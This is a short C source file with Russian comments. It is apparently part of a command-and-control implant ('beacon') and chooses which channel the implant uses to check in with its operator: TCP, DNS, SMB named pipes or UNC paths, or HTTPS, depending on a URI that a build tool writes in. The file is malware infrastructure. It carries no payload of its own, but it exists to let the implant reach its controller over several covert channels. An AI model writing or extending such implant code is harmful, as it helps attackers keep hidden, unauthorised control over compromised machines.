// Transport selector.
//
// Активный транспорт определяется по полю uri_checkin (его правит artifact-gen):
//   "tcp://..."  → g_transport_tcp   (host/port — обычные)
//   "smb://..."  → g_transport_smb   (host = UNC-target, имя пайпа в uri_checkin)
//   "\\\\..."    → g_transport_smb
//   иначе        → g_transport_https

#include "beacon.h"

static int wstartswith(const wchar_t* s, const wchar_t* prefix) {
    for (size_t i = 0; prefix[i]; ++i) {
        if (s[i] != prefix[i]) return 0;
    }
    return 1;
}

const TransportVtbl* select_transport(void) {
    BeaconState* st = beacon_state();
    const wchar_t* u = st->uri_checkin;
    if (wstartswith(u, L"tcp://")) {
        bdbg("[transport] selected: TCP\n");
        return &g_transport_tcp;
    }
    if (wstartswith(u, L"dns://")) {
        bdbg("[transport] selected: DNS\n");
        return &g_transport_dns;
    }
    if (wstartswith(u, L"smb://")) {
        bdbg("[transport] selected: SMB\n");
        return &g_transport_smb;
    }
    if (u[0] == L'\\' && u[1] == L'\\') {
        bdbg("[transport] selected: SMB (UNC)\n");
        return &g_transport_smb;
    }
    bdbg("[transport] selected: HTTPS\n");
    return &g_transport_https;
}
